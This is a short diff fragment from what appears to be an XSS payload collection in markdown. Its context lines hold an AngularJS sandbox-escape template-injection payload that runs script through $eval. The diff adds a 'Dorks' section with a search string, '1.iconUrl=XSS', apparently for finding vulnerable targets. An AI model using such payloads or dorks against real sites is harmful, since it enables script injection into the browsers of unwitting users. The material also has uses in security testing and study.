@@ -37,3 +37,11 @@ Payload:
 {{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
 ```
 
+
+
+## Dorks
+
+```
+1.iconUrl=XSS
+```
+
